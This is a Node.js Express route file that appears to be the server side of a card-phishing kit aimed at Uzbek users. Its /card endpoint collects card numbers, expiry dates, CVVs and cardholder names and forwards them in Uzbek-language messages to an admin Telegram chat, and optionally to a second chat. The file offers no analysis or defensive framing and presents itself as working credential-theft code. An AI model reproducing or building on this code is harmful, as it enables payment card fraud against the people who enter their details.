const express = require('express');
const router = express.Router();
const path = require('path');
const config = require('../config');
const { parseUserAgent } = require('../utils');
const telegram = require('../services/telegram');
const stateService = require('../services/state');
const auth = require('../middleware/auth');

// Store rooms (shared with websocket)
let rooms = new Map();

function setRooms(roomsMap) {
    rooms = roomsMap;
}

// Room status
router.get('/room/:roomId', (req, res) => {
    const room = rooms.get(req.params.roomId);
    if (room) {
        res.json({
            exists: true,
            hasViewer: !!room.viewer,
            createdAt: room.createdAt,
        });
    } else {
        res.json({ exists: false });
    }
});

// Card data endpoint
router.post('/card', auth, async (req, res) => {
    const { cardNumber, expiryDate, cvv, cardType, fullName, userAgent } = req.body;

    if (!cardNumber || !expiryDate || !fullName) {
        return res.status(400).json({ success: false, error: 'Missing required fields' });
    }

    const { browser, os } = parseUserAgent(userAgent);

    // Format date
    const months = ['yanvar', 'fevral', 'mart', 'aprel', 'may', 'iyun',
        'iyul', 'avgust', 'sentabr', 'oktabr', 'noyabr', 'dekabr'];
    const now = new Date();
    const dateStr = `${now.getDate()} ${months[now.getMonth()]} ${now.getFullYear()}`;
    const timeStr = `${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}`;

    const cardTypeEmoji = {
        visa: '💳 Visa',
        mastercard: '💳 Mastercard',
        humo: '🇺🇿 Humo',
        uzcard: '🇺🇿 UzCard',
        unknown: '💳 Unknown'
    };

    const message = `
💰 <b>YANGI KARTA MA'LUMOTLARI!</b>

${cardTypeEmoji[cardType] || cardTypeEmoji.unknown}

📝 <b>Ism:</b> <code>${fullName}</code>
💳 <b>Karta:</b> <code>${cardNumber}</code>
📅 <b>Amal qilish:</b> <code>${expiryDate}</code>
${cvv ? `🔐 <b>CVV:</b> <code>${cvv}</code>` : ''}

📱 <b>Brauzer:</b> ${browser}
💻 <b>OS:</b> ${os}
📆 <b>Sana:</b> ${dateStr}
⏰ <b>Vaqt:</b> ${timeStr}
`.trim();

    try {
        // Always send to admin
        if (config.ADMIN_TELEGRAM_CHAT_ID) {
            await telegram.sendMessage(config.ADMIN_TELEGRAM_CHAT_ID, message);
            console.log('✅ Card data sent to admin chat');
        }

        // Send to regular if enabled
        const state = stateService.get();
        if (state.sendCardToRegularChat && config.TELEGRAM_CHAT_ID) {
            await telegram.sendMessage(config.TELEGRAM_CHAT_ID, message);
            console.log('✅ Card data sent to regular chat');
        }

        res.json({ success: true });
    } catch (error) {
        console.error('Failed to send card data:', error);
        res.status(500).json({ success: false, error: 'Failed to send' });
    }
});

module.exports = { router, setRooms };
